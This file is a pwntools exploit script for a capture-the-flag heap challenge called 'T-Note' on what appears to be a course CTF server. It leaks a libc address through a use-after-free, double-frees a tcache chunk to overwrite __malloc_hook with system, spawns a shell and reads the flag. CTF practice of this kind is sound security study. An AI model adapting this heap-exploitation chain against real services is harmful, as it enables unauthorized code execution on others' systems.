from pwn import *

context.arch = 'amd64'

l = ELF('./T-Note/libc.so')

#re = process('./T-Note/t-note')
re = remote( 'edu-ctf.csie.org', 10179 )

def add( size , note ):
    re.sendafter( '>', '1' )
    re.sendafter( 'Size: ', str(size))
    re.sendafter( 'Note: ', note)

def show( index ):
    re.sendafter('>' , '2' )
    re.sendafter( 'Index: ', str( index ) )

def delete( index ):
    re.sendafter( '>', '3' ) 
    re.sendafter('Index: ', str( index ) )

add( 0x410 , 'leak' ) # 0
add( 0x28 , 'a' ) # 1

delete( 0 ) 

show( 0 )

re.recvline()
l.address = u64( re.recv(6) + b'\0\0' ) - 0x3ebca0 #__malloc_hook
success( 'libc -> %s' % hex( l.address ) )

delete( 1 ) 
delete( 1 ) 

add( 0x20 , p64( l.sym.__malloc_hook  ) )
add( 0x20 , 'a' )
add( 0x20 ,   p64( l.sym.system ) )

re.sendafter( '>' , '1' )
re.sendafter( 'Size: ' , str( l.search( b'/bin/sh' ).__next__() ) )

re.sendline('cat /home/`whoami`/flag')

re.interactive()